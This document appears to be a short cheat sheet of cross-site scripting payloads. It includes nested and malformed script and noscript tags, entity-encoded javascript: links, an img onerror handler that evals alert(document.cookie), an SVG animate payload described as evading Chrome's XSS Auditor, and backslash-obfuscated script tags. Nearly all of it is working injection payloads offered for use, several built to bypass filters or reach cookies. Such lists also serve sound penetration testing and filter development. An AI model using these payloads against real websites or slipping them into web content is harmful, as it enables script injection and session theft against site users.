<output>
<noscript onerror=prompt(0);><a href="javascript:alert("XSS")>XSS</a>"><script onerror="<noscript onerror="<script>alert("XSS")</script>"><IMG src=<script src="/">alert(" "XSS" ")</script></noscript>"<script>alert("XSS")</script></noscript>
</output>
<a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>

<img src=x onerror="eval('alert(document.cookie)')"/>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>This payload injects a malicious script into an SVG element. The script sets the href attribute of the animate element to javascript:alert(1), which will execute the alert function when clicked. Since the script is injected into an SVG element, the Chrome XSS-Auditor fails to detect it.
<a href=”#” onclick=”… var input=’controllable data here’; …”>



<</div>script</div>>alert()<</div>/script</div>>
<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
